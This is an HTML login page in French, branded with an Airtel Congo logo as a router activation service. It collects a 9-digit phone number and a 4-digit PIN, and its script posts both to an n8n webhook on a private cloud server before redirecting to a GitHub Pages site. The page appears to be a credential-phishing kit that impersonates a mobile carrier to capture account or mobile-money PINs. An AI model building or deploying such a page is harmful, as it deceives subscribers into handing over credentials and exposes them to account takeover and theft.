<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Formulaire d'Authentification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #f2f2f2;
    }
    header {
      display: flex;
      align-items: center;
      padding: 10px;
      background-color: #FF0000;
      color: white;
    }
    header img {
      height: 50px;
      margin-right: 30px;
    }
    .card { 
      background: white; 
      padding: 20px; 
      border-radius: 8px; 
      max-width: 500px; 
      margin: auto; 
      box-shadow: 0 0 10px rgba(0,0,0,0.1); 
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }
    label {
      margin-bottom: 5px;
      font-weight: bold;
    }
    input {
      padding: 10px;
      margin: 10px;
      width: 300px;
    }
    button {
      padding: 12px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <header>
    <img src="https://raw.githubusercontent.com/christale-kib/routeur-paiement/main/Airtel_Congo.jpg" alt="Logo">
    <h1>Service d'activation de routeur</h1>
  </header>

  <div class="card">
    <form id="loginForm">
      <label for="numero">Numéro</label>
      <input type="text" id="numero" name="numero" pattern="\d{9}" inputmode="numeric" maxlength="9" required>

      <label for="password">Mot de passe</label>
      <input type="password" id="password" name="password" pattern="\d{4}" inputmode="numeric" maxlength="4" required>

      <button type="submit">Valider</button>
    </form>
  </div>

  <footer>
    <p>&copy; 2025 - Service d'activation de Routeur. Tous droits réservés.</p>
  </footer>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      const numero = document.getElementById("numero").value;
      const password = document.getElementById("password").value;

      try {
        const response = await fetch("https://n8n.srv878521.hstgr.cloud/webhook/Authentification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ numero, password })
        });

        const data = await response.json();

        if (data.auth === true) {
          // Utilisateur authentifié → redirection
          window.location.href = "https://christale-kib.github.io/routeur-paiement/accueil";
        } else {
          alert("Identifiants invalides !");
        }
      } catch (error) {
        console.error("Erreur :", error);
        alert("Une erreur est survenue.");
      }
    });
  </script>

</body>
</html>
